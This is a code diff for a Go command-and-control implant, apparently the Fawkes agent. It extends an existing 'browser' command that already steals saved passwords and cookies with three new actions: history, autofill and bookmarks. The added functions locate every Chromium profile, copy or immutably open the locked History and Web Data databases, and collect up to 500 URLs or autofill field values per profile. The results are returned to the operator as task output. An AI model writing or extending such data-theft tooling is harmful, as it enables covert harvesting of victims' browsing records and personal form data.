@@ -13,6 +13,7 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"time"
 	"unsafe"
 
 	"fawkes/pkg/structs"
@@ -33,7 +34,7 @@ func (c *BrowserCommand) Description() string {
 }
 
 type browserArgs struct {
-	Action  string `json:"action"`  // passwords (default), cookies
+	Action  string `json:"action"`  // passwords (default), cookies, history, autofill, bookmarks
 	Browser string `json:"browser"` // all (default), chrome, edge
 }
 
@@ -77,9 +78,15 @@ func (c *BrowserCommand) Execute(task structs.Task) structs.CommandResult {
 		return browserPasswords(args)
 	case "cookies":
 		return browserCookies(args)
+	case "history":
+		return browserHistory(args)
+	case "autofill":
+		return browserAutofill(args)
+	case "bookmarks":
+		return browserBookmarks(args)
 	default:
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s. Use: passwords, cookies", args.Action),
+			Output:    fmt.Sprintf("Unknown action: %s. Use: passwords, cookies, history, autofill, bookmarks", args.Action),
 			Status:    "error",
 			Completed: true,
 		}
@@ -644,4 +651,398 @@ func readCookieData(dbPath string, key []byte, browserName, profileName string) 
 	}
 
 	return cookies, nil
+}
+
+// findProfilesWithFile returns profile directories containing the given file (or subpath).
+func findProfilesWithFile(userDataDir string, relPath string) []string {
+	var profiles []string
+
+	check := func(dir string) {
+		if _, err := os.Stat(filepath.Join(dir, relPath)); err == nil {
+			profiles = append(profiles, dir)
+		}
+	}
+
+	check(filepath.Join(userDataDir, "Default"))
+
+	entries, err := os.ReadDir(userDataDir)
+	if err != nil {
+		return profiles
+	}
+	for _, entry := range entries {
+		if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile ") {
+			check(filepath.Join(userDataDir, entry.Name()))
+		}
+	}
+
+	return profiles
+}
+
+// openBrowserDB opens a browser SQLite database using the copy+fallback pattern.
+// Returns (db, cleanup func, error). Caller must call cleanup when done.
+func openBrowserDB(dbPath string) (*sql.DB, func(), error) {
+	// Strategy 1: Copy DB to temp file
+	tf, tfErr := os.CreateTemp("", "")
+	if tfErr == nil {
+		tmpFile := tf.Name()
+		tf.Close()
+		if copyErr := copyFile(dbPath, tmpFile); copyErr == nil {
+			db, err := sql.Open("sqlite", tmpFile)
+			if err == nil {
+				cleanup := func() {
+					db.Close()
+					os.Remove(tmpFile)
+				}
+				return db, cleanup, nil
+			}
+		}
+		os.Remove(tmpFile)
+	}
+
+	// Strategy 2: Open in immutable mode
+	immutableURI := "file:///" + filepath.ToSlash(dbPath) + "?immutable=1"
+	db, err := sql.Open("sqlite", immutableURI)
+	if err != nil {
+		return nil, func() {}, fmt.Errorf("open %s: %w", filepath.Base(dbPath), err)
+	}
+	cleanup := func() { db.Close() }
+	return db, cleanup, nil
+}
+
+// browserHistory extracts browsing history from Chromium browsers.
+func browserHistory(args browserArgs) structs.CommandResult {
+	paths := browserPaths(args.Browser)
+	if paths == nil {
+		return structs.CommandResult{
+			Output:    "Could not determine LOCALAPPDATA path",
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	type historyEntry struct {
+		Browser    string
+		URL        string
+		Title      string
+		VisitCount int
+		LastVisit  string
+	}
+
+	var allEntries []historyEntry
+	var errors []string
+
+	for browserName, userDataDir := range paths {
+		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
+			continue
+		}
+
+		profiles := findProfilesWithFile(userDataDir, "History")
+		if len(profiles) == 0 {
+			continue
+		}
+
+		for _, profileDir := range profiles {
+			dbPath := filepath.Join(profileDir, "History")
+			profileName := filepath.Base(profileDir)
+
+			db, cleanup, err := openBrowserDB(dbPath)
+			if err != nil {
+				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
+				continue
+			}
+
+			rows, err := db.Query("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500")
+			if err != nil {
+				errors = append(errors, fmt.Sprintf("%s (%s): query: %v", browserName, profileName, err))
+				cleanup()
+				continue
+			}
+
+			label := browserName
+			if profileName != "Default" {
+				label = fmt.Sprintf("%s (%s)", browserName, profileName)
+			}
+
+			for rows.Next() {
+				var url, title string
+				var visitCount int
+				var lastVisitTime int64
+
+				if err := rows.Scan(&url, &title, &visitCount, &lastVisitTime); err != nil {
+					continue
+				}
+
+				// Chrome timestamps are microseconds since 1601-01-01
+				lastVisit := chromeTimeToString(lastVisitTime)
+
+				allEntries = append(allEntries, historyEntry{
+					Browser:    label,
+					URL:        url,
+					Title:      title,
+					VisitCount: visitCount,
+					LastVisit:  lastVisit,
+				})
+			}
+			rows.Close()
+			cleanup()
+		}
+	}
+
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("=== Browser History (%d entries) ===\n\n", len(allEntries)))
+
+	for _, e := range allEntries {
+		title := e.Title
+		if title == "" {
+			title = "(no title)"
+		}
+		sb.WriteString(fmt.Sprintf("[%s] %s\n  %s  (visits: %d, last: %s)\n",
+			e.Browser, truncStr(title, 80), truncStr(e.URL, 120), e.VisitCount, e.LastVisit))
+	}
+
+	if len(errors) > 0 {
+		sb.WriteString("\n--- Errors ---\n")
+		for _, e := range errors {
+			sb.WriteString(fmt.Sprintf("  %s\n", e))
+		}
+	}
+
+	return structs.CommandResult{
+		Output:    sb.String(),
+		Status:    "success",
+		Completed: true,
+	}
+}
+
+// browserAutofill extracts autofill form data from Chromium browsers.
+func browserAutofill(args browserArgs) structs.CommandResult {
+	paths := browserPaths(args.Browser)
+	if paths == nil {
+		return structs.CommandResult{
+			Output:    "Could not determine LOCALAPPDATA path",
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	type autofillEntry struct {
+		Browser      string
+		FieldName    string
+		Value        string
+		Count        int
+		DateLastUsed string
+	}
+
+	var allEntries []autofillEntry
+	var errors []string
+
+	for browserName, userDataDir := range paths {
+		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
+			continue
+		}
+
+		profiles := findProfilesWithFile(userDataDir, "Web Data")
+		if len(profiles) == 0 {
+			continue
+		}
+
+		for _, profileDir := range profiles {
+			dbPath := filepath.Join(profileDir, "Web Data")
+			profileName := filepath.Base(profileDir)
+
+			db, cleanup, err := openBrowserDB(dbPath)
+			if err != nil {
+				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
+				continue
+			}
+
+			rows, err := db.Query("SELECT name, value, count, date_last_used FROM autofill ORDER BY date_last_used DESC LIMIT 500")
+			if err != nil {
+				errors = append(errors, fmt.Sprintf("%s (%s): query: %v", browserName, profileName, err))
+				cleanup()
+				continue
+			}
+
+			label := browserName
+			if profileName != "Default" {
+				label = fmt.Sprintf("%s (%s)", browserName, profileName)
+			}
+
+			for rows.Next() {
+				var name, value string
+				var count int
+				var dateLastUsed int64
+
+				if err := rows.Scan(&name, &value, &count, &dateLastUsed); err != nil {
+					continue
+				}
+
+				lastUsed := chromeTimeToString(dateLastUsed)
+
+				allEntries = append(allEntries, autofillEntry{
+					Browser:      label,
+					FieldName:    name,
+					Value:        value,
+					Count:        count,
+					DateLastUsed: lastUsed,
+				})
+			}
+			rows.Close()
+			cleanup()
+		}
+	}
+
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("=== Browser Autofill (%d entries) ===\n\n", len(allEntries)))
+
+	for _, e := range allEntries {
+		sb.WriteString(fmt.Sprintf("[%s] %s = %s  (used: %d times, last: %s)\n",
+			e.Browser, e.FieldName, truncStr(e.Value, 60), e.Count, e.DateLastUsed))
+	}
+
+	if len(errors) > 0 {
+		sb.WriteString("\n--- Errors ---\n")
+		for _, e := range errors {
+			sb.WriteString(fmt.Sprintf("  %s\n", e))
+		}
+	}
+
+	return structs.CommandResult{
+		Output:    sb.String(),
+		Status:    "success",
+		Completed: true,
+	}
+}
+
+// browserBookmarks extracts bookmarks from Chromium browsers.
+func browserBookmarks(args browserArgs) structs.CommandResult {
+	paths := browserPaths(args.Browser)
+	if paths == nil {
+		return structs.CommandResult{
+			Output:    "Could not determine LOCALAPPDATA path",
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	var allBookmarks []browserBookmarkEntry
+	var errors []string
+
+	for browserName, userDataDir := range paths {
+		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
+			continue
+		}
+
+		profiles := findProfilesWithFile(userDataDir, "Bookmarks")
+		if len(profiles) == 0 {
+			continue
+		}
+
+		for _, profileDir := range profiles {
+			bmPath := filepath.Join(profileDir, "Bookmarks")
+			profileName := filepath.Base(profileDir)
+
+			data, err := os.ReadFile(bmPath)
+			if err != nil {
+				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
+				continue
+			}
+
+			var bmFile struct {
+				Roots map[string]json.RawMessage `json:"roots"`
+			}
+			if err := json.Unmarshal(data, &bmFile); err != nil {
+				errors = append(errors, fmt.Sprintf("%s (%s): parse: %v", browserName, profileName, err))
+				continue
+			}
+
+			label := browserName
+			if profileName != "Default" {
+				label = fmt.Sprintf("%s (%s)", browserName, profileName)
+			}
+
+			for rootName, raw := range bmFile.Roots {
+				// Skip non-object roots (e.g. "sync_transaction_version")
+				if len(raw) == 0 || raw[0] != '{' {
+					continue
+				}
+				var node bookmarkNode
+				if err := json.Unmarshal(raw, &node); err != nil {
+					continue
+				}
+				extractBookmarks(&node, label, rootName, &allBookmarks)
+			}
+		}
+	}
+
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("=== Browser Bookmarks (%d found) ===\n\n", len(allBookmarks)))
+
+	for _, b := range allBookmarks {
+		sb.WriteString(fmt.Sprintf("[%s] [%s] %s\n  %s\n",
+			b.Browser, b.Folder, truncStr(b.Name, 80), truncStr(b.URL, 120)))
+	}
+
+	if len(errors) > 0 {
+		sb.WriteString("\n--- Errors ---\n")
+		for _, e := range errors {
+			sb.WriteString(fmt.Sprintf("  %s\n", e))
+		}
+	}
+
+	return structs.CommandResult{
+		Output:    sb.String(),
+		Status:    "success",
+		Completed: true,
+	}
+}
+
+type browserBookmarkEntry struct {
+	Browser string
+	Name    string
+	URL     string
+	Folder  string
+}
+
+type bookmarkNode struct {
+	Type     string         `json:"type"`
+	Name     string         `json:"name"`
+	URL      string         `json:"url"`
+	Children []bookmarkNode `json:"children"`
+}
+
+func extractBookmarks(node *bookmarkNode, browser, folder string, out *[]browserBookmarkEntry) {
+	if node.Type == "url" && node.URL != "" {
+		*out = append(*out, browserBookmarkEntry{
+			Browser: browser,
+			Name:    node.Name,
+			URL:     node.URL,
+			Folder:  folder,
+		})
+	}
+	for i := range node.Children {
+		childFolder := folder
+		if node.Children[i].Type == "folder" {
+			childFolder = folder + "/" + node.Children[i].Name
+		}
+		extractBookmarks(&node.Children[i], browser, childFolder, out)
+	}
+}
+
+// chromeTimeToString converts a Chrome/Chromium timestamp (microseconds since 1601-01-01)
+// to a human-readable UTC string. Returns empty string for zero/invalid times.
+func chromeTimeToString(chromeTime int64) string {
+	if chromeTime <= 0 {
+		return "never"
+	}
+	// Chrome epoch: 1601-01-01 00:00:00 UTC
+	// Unix epoch:   1970-01-01 00:00:00 UTC
+	// Difference:   11644473600 seconds = 11644473600000000 microseconds
+	const chromeToUnixMicros = 11644473600000000
+	unixMicros := chromeTime - chromeToUnixMicros
+	if unixMicros < 0 {
+		return "unknown"
+	}
+	t := time.Unix(unixMicros/1000000, (unixMicros%1000000)*1000)
+	return t.UTC().Format("2006-01-02 15:04:05")
 }
